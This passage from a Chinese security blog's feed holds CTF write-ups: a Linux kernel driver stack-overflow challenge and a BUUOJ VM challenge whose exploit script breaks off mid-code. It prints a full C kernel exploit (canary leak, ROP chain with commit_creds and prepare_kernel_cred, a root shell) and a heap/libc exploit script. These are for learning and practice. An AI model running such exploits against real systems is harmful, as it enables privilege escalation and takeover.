__int16)a1);</code>中长度是<code>(unsigned __int16)a1)</code>，最大可为0xFFFF，从而存在栈溢出。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_int64 __fastcall core_copy_func(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">    __int64 v3; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">    unsigned __int64 v4; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">    v4 &#x3D; __readgsqword(0x28u);</span><br><span class="line">    printk(&amp;unk_215, a2);</span><br><span class="line">    if ( a1 &gt; 63 )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_2A1, a2);</span><br><span class="line">        result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        result &#x3D; 0LL;</span><br><span class="line">        qmemcpy(&amp;v3, &amp;name, (unsigned __int16)a1);</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>同时驱动模块提供<code>core_write</code>回调函数，接受用户态的输入储存到变量<code>name</code>中：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    v3 = a3;</span><br><span class="line">    printk(&amp;unk_215, a2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, v3) )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">    printk(&amp;unk_230, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先在<code>core.cpio</code>解包出的文件<code>init</code>中，patch自动关机的命令<code>poweroff -d 120 -f &amp;</code>为<code>poweroff -d 0 -f &amp;</code>再重新打包。</li><li>通过<code>0x6677889C</code>功能设置<code>off</code>为0x40，从而<code>&amp;v6+off</code>的位置指向栈上的canary，再通过<code>0x6677889B</code>功能leak出canary以及PIE。</li><li>然后通过保存当前用户态的寄存器信息，在从内核态提权返回的时候用来恢复寄存器的信息。 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>之后通过<code>write(fd, rop, 0x100)</code>布置rop chain到<code>name</code>中去： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+----------------+ 0</span><br><span class="line">|      fill      |</span><br><span class="line">..................</span><br><span class="line">|      fill      |</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+ +0x40</span><br><span class="line">|     canary     |</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|   priviledge   |  &#x3D;&#x3D;&gt; commit_creds(perpare_kernel_cred(0));</span><br><span class="line">+----------------+</span><br><span class="line">|     swapgs     |  &#x3D;&#x3D;&gt; swapgs; pop rbp; ret;</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|      iret      |  &#x3D;&#x3D;&gt; iret</span><br><span class="line">+----------------+</span><br><span class="line">|    getshell    |  &#x3D;&#x3D;&gt; system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">+----------------+</span><br><span class="line">|    user_cs     |</span><br><span class="line">+----------------+</span><br><span class="line">|   user_rflags  |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_sp     |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_ss     |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure></li><li>最后通过<code>0x6677889A</code>触发栈溢出，get root shell。</li><li>此外，因为<code>commit_creds</code>和<code>prepare_kernel_cred</code>是内核函数，其地址存放在<code>/proc/kallsyms</code>中，但是非root用户在直接读取的时候是读不到地址数据的（全是0）。而注意到<code>init</code>中: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br></pre></td></tr></table></figure> 把<code>/proc/kallsyms</code>拷贝到<code>/tmp/kallsyms</code>中去了从而可以读到函数地址，在执行<code>poc</code>的时候手动输入即可。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">size_t</span> commit_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] Input the address of prepare_kernel_cred: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] Input the address of commit_cred: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lx"</span>, &amp;commit_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">priviledge_escalation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)commit_cred;</span><br><span class="line"></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> canary[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">size_t</span> ret_addr, swapgs_addr, iret_addr;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get prepare_kernel_cred and commit_cred</span></span><br><span class="line">    GetAddr(&amp;prepare_kernel_cred, &amp;commit_cred);</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/proc/core"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    <span class="built_in">memset</span>(canary, <span class="number">101</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, COM_OFF, <span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd, COM_READ, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Read finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get ret_addr, iret_addr</span></span><br><span class="line">    ret_addr = *(<span class="keyword">size_t</span> *)(canary + <span class="number">0x10</span>);</span><br><span class="line">    swapgs_addr = ret_addr - <span class="number">0xc5</span>;</span><br><span class="line">    iret_addr = prepare_kernel_cred - <span class="number">311838</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ret_addr: %lx\n"</span>, ret_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] swapgs_addr: %lx\n"</span>, swapgs_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] iret_addr: %lx\n"</span>, iret_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save status</span></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set name</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = *(<span class="keyword">size_t</span> *)canary;</span><br><span class="line">    rop[i++] = <span class="number">0xdeadbeefbeefdead</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)&amp;priviledge_escalation;</span><br><span class="line">    rop[i++] = swapgs_addr;  <span class="comment">// gadget swapgs_pop_rbp_ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[i++] = iret_addr;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)&amp;getshell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write</span>(fd, rop, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Write finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write rop</span></span><br><span class="line">    ioctl(fd, COM_WRITE, <span class="number">0xff00000000000100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn_core.c -masm=intel -static -lutil -o pwn_core</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>总的来说这还是一道比较简单的题，ROP的利用思路也看起来相对简单，有些保护比如<code>smep</code>没开导致可以直接在内核态执行用户代码，所以布置rop相对轻松。</li><li>做kernel pwn rop的基本思路基本可以从这道题中了解了，主要是通过各种方法提权然后返回用户态开shell，尽管方式各异。</li><li>复现core算是开了一个小头，最近看了有一定数量的kernel pwn的分析文章了，但是很多都是看看而已还没动手复现过，只是留了个印象方便之后复现的时候过于生疏。</li><li>总之kernel pwn还是需要一些kernel的知识的，要学的东西还很多，慢慢学吧。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/#ioctl" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/#ioctl</a></li><li><a href="https://www.anquanke.com/post/id/201043" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201043</a></li><li><a href="https://www.anquanke.com/post/id/172216" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172216</a></li><li><a href="https://www.jianshu.com/p/8d950a9d8974" target="_blank" rel="noopener">https://www.jianshu.com/p/8d950a9d8974</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;早就该学习kernel pwn，否则得被时代抛弃了。先从简单的入手吧，&lt;del&gt;复现几道以前的ROP赛题&lt;/del&gt;目前只找到强网杯的题目，顺便从中学习一点kernel的基础知识。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.com/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ 刷题记录 -- CISCN</title>
    <link href="https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN/"/>
    <id>https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN/</id>
    <published>2020-05-05T15:37:27.000Z</published>
    <updated>2021-04-20T14:44:50.796Z</updated>
    
    <content type="html"><![CDATA[<p>pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。<br><br><b>更新：10道刷完，有些题目还是挺有意思的。</b></p><a id="more"></a><h1 id="ciscn-final-1"><a href="#ciscn-final-1" class="headerlink" title="ciscn_final_1"></a>ciscn_final_1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>binary内部实现了一个虚拟机，有自己的指令集，其实逻辑搞清楚了问题不大（虽然我看了蛮久），主要是写脚本的时候要花点时间。（本地给的glibc2.23的环境，打通了；但是远程给的glibc2.27，在调试的时候发现<code>mmap</code>没有触发，也就是说分配出来的内存空间没有紧挨着libc，结果没法打通。讲道理不应该啊，两个版本的libc这里的逻辑不是一样吗，阈值应该都是128k啊。）</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>16 bits的机器码，大端数据，高4 bits是opcode，后面要么是寄存器的index，要么是立即数，要么是标志位。若高4 bits是0xF，根据低8 bits的值，对应了一些输出，停机，退出指令。（binary的database不小心删了，就不贴反汇编的代码了）</li><li>关键在于利用其中的<code>opcode==6</code>和<code>opcode==7</code>的两条指令，分别是对应访问内存以及写入内存，且地址是32 bits，说明可以相对内存溢出。</li><li>由于内存是分配在堆上的，而且申请的<code>size==0x1FFFE</code>，是会通过<code>mmap</code>申请的，而且位置正好紧挨着libc且位于上方。所以通过上述的根据偏移访问内存和读写内存可以操作到libc的位置上。</li><li>所以根据以上，可以通过溢出，根据偏移读写libc。</li><li>首先读出<code>_IO_list_all</code>位置存的<code>_IO_2_1_stderr_</code>的地址，从而leak libc。</li><li>再向<code>__free_hook</code>写<code>system</code></li><li>最后在输入指令的时候，在内存开头写入”/bin/sh”，并且在虚拟机开始执行的地址处(偏移为0x6000=0x3000 *sizeof(_WORD))写入<code>exit</code>指令触发<code>free</code>内存的操作，从而getshell。</li><li>以上步骤可以通过<code>halt</code>分隔，因为<code>halt</code>可以重新接受输入指令再次执行。</li><li><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addi</span><span class="params">(reg_dst, reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xF</span>)</span><br><span class="line">    binary_str = <span class="string">"0001"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"1"</span></span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">5</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0110"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0111"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(reg_dst, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0010"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0011"</span></span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_reg0</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF021</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">halt</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF025</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">big_endian</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(val &gt;&gt; <span class="number">8</span>) + chr(val &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stderr</span><span class="params">()</span>:</span></span><br><span class="line">    offset 